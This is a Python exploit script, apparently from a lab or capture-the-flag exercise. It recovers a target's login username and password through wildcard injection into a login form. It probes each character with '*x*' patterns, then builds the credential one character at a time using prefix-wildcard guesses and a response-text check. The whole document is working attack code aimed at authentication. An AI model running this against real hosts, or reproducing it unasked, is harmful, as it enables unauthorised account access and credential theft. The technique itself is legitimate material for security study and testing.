#!/usr/bin/python

import requests
import string
import sys

character_set = string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation
character_set = character_set.replace("*", "")

login_credentials = {
    "username": "*",
    "password": "*"
}

login_url = "http://%(host)s/login"


def login(login_credentials):
    login_response = requests.post(login_url, data=login_credentials)
    return login_response
    
def get_username():
    username = crack_username()
    print("[+] Username found: %s" %(username))


def crack_username():
    username = crack("username") 
    return username


def get_password():
    password = crack_password()
    print("[+] Password found: %s" %(password))


def crack_password():
    password = crack("password")
    return password

def crack(field):
    correct_credential = ""
    guessed_characters = guess_characters_in_field(field)
    print("[!] %s character set: %s" %(field, str(guessed_characters)))
    print("[*] Building %s\n" %(field))
    for _ in range(len(guessed_characters)):
        for character in guessed_characters:
            credential_guess = correct_credential + character
            if field == "username":
                login_credentials["username"] = "%s*" %(credential_guess)
            else:
                login_credentials["password"] = "%s*" %(credential_guess)
            login_response = login(login_credentials)
            if is_login_successful(login_response):
                correct_credential += character
            
    return correct_credential

    
def guess_characters_in_field(field):
    guess = []
    print("[*] Finding characters used in %s" %(field))
    for character in character_set:
        if field == "username":
            login_credentials["username"] = "*%s*" %(character) # Wildcard search
        else:
            login_credentials["password"] = "*%s*" %(character) # Wildcard search
        login_response = login(login_credentials)

        if is_login_successful(login_response):
            guess.append(character)
    return guess


def is_login_successful(login_response):
    if "No search results" in login_response.text:
        return True
    return False


def usage():
    program_name = sys.argv[0]
    print("%s [username | password] [host]\n" %(program_name))
    sys.exit(1)

    
if __name__ == "__main__":
    args = sys.argv
    args_count = len(sys.argv)
    print("[!] Cracking character set: %s\n" %(character_set))
    
    if args_count < 3:
        usage()
        
    host = args[2]
    login_url = login_url %({"host": host})
    action = args[1]

    if action == "password":
        get_password()
    elif action == "username":
        get_username()
    else:
        usage()
        
